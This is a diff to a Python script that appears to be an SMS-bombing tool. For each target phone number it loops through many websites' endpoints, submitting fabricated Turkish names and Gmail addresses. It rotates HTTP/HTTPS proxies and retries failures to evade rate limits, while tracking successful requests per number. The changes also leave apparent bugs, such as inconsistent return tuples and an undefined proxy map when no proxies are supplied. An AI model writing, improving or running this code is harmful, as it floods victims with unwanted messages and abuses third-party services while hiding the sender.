@@ -50,10 +50,28 @@ def get_next_proxy(proxy_iterator, proxies):
         proxy_iterator = itertools.cycle(shuffle_proxies(proxies))
         return next(proxy_iterator)
 
+def decompose_proxy_url(proxy_url, key):
+    proxy_parts = {}
+
+    if '@' in proxy_url:
+        user_pass, ip_port = proxy_url.split('@')
+        username, password = user_pass.split('//')[1].split(':')
+        proxy_parts['username'] = username
+        proxy_parts['password'] = password
+    else:
+        ip_port = proxy_url.split('//')[1]
+
+    ip, port = ip_port.split(':')
+    proxy_parts['ip'] = ip
+    proxy_parts['port'] = port
+
+    return proxy_parts.get(key)
+
 def handle_response(response, success_criteria, failure_msg, response_base, proxy, developer_mode=False):
     if developer_mode:
         print(f"Response: {response.text}")
         print(f"Response status code: {response.status_code}")
+        print(f"Proxy: {proxy}")
         
     # success_criteria and failure_msg could be a list or a string, ensure they are always lists of strings for consistency
     success_criteria = [str(criteria) for criteria in (success_criteria if isinstance(success_criteria, list) else [success_criteria])]
@@ -94,8 +112,13 @@ def handle_response(response, success_criteria, failure_msg, response_base, prox
         return False, 'unknown response'
         
 def handle_errors(developer_mode, e=None, proxy=None):
+    if developer_mode: 
+        print(f"Proxy: {proxy}")
     if isinstance(e, requests.exceptions.Timeout):
-        return False, 'response timeout'
+        if proxy:
+            return False,False, 'response timeout'
+        else:
+            return False, 'response timeout'
     else:
         if developer_mode and e:
             print(f"Error: {str(e)}")
@@ -116,8 +139,6 @@ def send_request(session, phone_number, first_name, last_name, gmail, proxy, con
     
     try:
         url = config['url']
-        if url.startswith('https://'):
-            url = url.replace('https://', 'https://')
         method = config.get('method', 'POST')  # Default to 'POST' if not specified
 
         if 'payload_function' in config:
@@ -147,14 +168,9 @@ def send_request(session, phone_number, first_name, last_name, gmail, proxy, con
             return
         if proxy != "null":
             try:
-                proxy_parts = proxy.split(':')
-                if len(proxy_parts) == 4:
-                    ip, port, username, password = proxy_parts
-                    proxy_url = f'http://{username}:{password}@{ip}:{port}'
-                else:
-                    ip, port = proxy_parts
-                    proxy_url = f'http://{ip}:{port}'
-                proxies = {'http': proxy_url}
+                proxies = {'http': proxy,
+                           'https': proxy
+                        }
                 if method.upper() == 'POST':
                     if headers and developer_mode:
                         print(headers) 
@@ -207,8 +223,16 @@ def send_sms_requests(phone_numbers, proxies, developer_mode=False):
     iteration = 0
 
     if len(proxies) > 0:
-        proxies = shuffle_proxies(proxies)
-        proxy_iterator = itertools.cycle(proxies)
+        http_proxies = [proxy for proxy in proxies if proxy.startswith('http://')]
+        https_proxies = [proxy for proxy in proxies if proxy.startswith('https://')]
+        http_proxies = shuffle_proxies(http_proxies)
+        https_proxies = shuffle_proxies(https_proxies)
+        http_proxy_iterator = itertools.cycle(http_proxies)
+        https_proxy_iterator = itertools.cycle(https_proxies)
+        proxy_methods = {
+            "http": (http_proxy_iterator, http_proxies),
+            "https": (https_proxy_iterator, https_proxies),
+        }
     
     # Create session object
     session = requests.Session()
@@ -217,35 +241,46 @@ def send_sms_requests(phone_numbers, proxies, developer_mode=False):
         iteration += 1
         for index, phone_number in enumerate(phone_numbers):
             first_name, last_name, gmail = random_turkish_name_surname_gmail()
-            start_time = time.time()
 
             for website, config in website_configs.items():
+
                 success = False
                 success_request = False
                 msg = ''
                 proxy_used = None
                 failure_count = 0  # Initialize failure count for each website
-
+                url = config['url']
+                protocol = url.split('://', 1)[0]  # This will get "http" or "https" from the url
+                if protocol not in ["http", "https"]:
+                    print(f'Error: protocol must be either "http" or "https". Found: {protocol}')
+                    return
+                if protocol not in proxy_methods or len(proxy_methods[protocol][1]) == 0:
+                    print(f"{Fore.RED}No {protocol.upper()} proxies available. Cannot send request to {website}.{Fore.RESET}")
+                    continue
                 while not success_request and len(proxies) > 0 and failure_count < 5:
-                    proxy_used = get_next_proxy(proxy_iterator, proxies)
-                    success, success_request, msg = send_request(session, phone_number, first_name, last_name, gmail, proxy_used, config, developer_mode)
+                    proxy_iterator, protocol_proxies = proxy_methods[protocol]
+                    proxy_used = get_next_proxy(proxy_iterator, protocol_proxies)
+                    result = send_request(session, phone_number, first_name, last_name, gmail, proxy_used, config, developer_mode)
+                    success, success_request, msg = result
                     if developer_mode:
                         print(result)
-                    success, success_request, msg = result
                     if not success_request:
-                        print(f"{Fore.RED}Proxy {proxy_used} failed. Attempting with another proxy.{Fore.RESET}")
-                        proxy_used = get_next_proxy(proxy_iterator, proxies)
+                        print(f"{Fore.RED}Proxy {proxy_used} failed. Attempting with another proxy.{Fore.RESET}" if developer_mode else f"{Fore.RED}Proxy {decompose_proxy_url(proxy_used, 'ip')} failed. Attempting with another proxy.{Fore.RESET}")
+                        proxy_iterator, protocol_proxies = proxy_methods[protocol]
+                        proxy_used = get_next_proxy(proxy_iterator, protocol_proxies)
                         failure_count += 1  # Increment failure count on failure
 
                 if failure_count >= 5:
                     print(f"{Fore.RED}5 times failed for {website}. Moving on to next website.{Fore.RESET}")
-                    break  # break from this inner loop and move to the next website
+                    continue  # continue to the next website
 
                 if len(proxies) <= 0:
                     result = send_request(session, phone_number, first_name, last_name, gmail, "null", config, developer_mode)
                     if developer_mode:
                         print(result)
                     success, msg = result
+                else:
+                    proxy_used = decompose_proxy_url(proxy_used, 'ip')
 
                 if success:
                     successful_requests[phone_number] += 1
@@ -264,8 +299,4 @@ def send_sms_requests(phone_numbers, proxies, developer_mode=False):
                 if developer_mode:
                     print(f"msg: {msg}")
 
-            elapsed_time = time.time() - start_time
-            estimated_remaining_time = (elapsed_time / (index + 1)) * (len(phone_numbers) - (index + 1))
-            print(f"{Fore.BLUE}Loop: {iteration} | Number {index + 1}/{len(phone_numbers)} completed. Estimated time remaining until end of loop: {estimated_remaining_time:.2f} seconds")
-
-            print(f"{Fore.BLUE}Total successful requests: {total_successful_requests} | Total failed requests: {total_failed_requests} | Total unknown requests: {total_unknown_requests}")
+            print(f"{Fore.BLUE}Loop: {iteration} | {Fore.BLUE}Total successful requests: {total_successful_requests} | Total failed requests: {total_failed_requests} | Total unknown requests: {total_unknown_requests}")
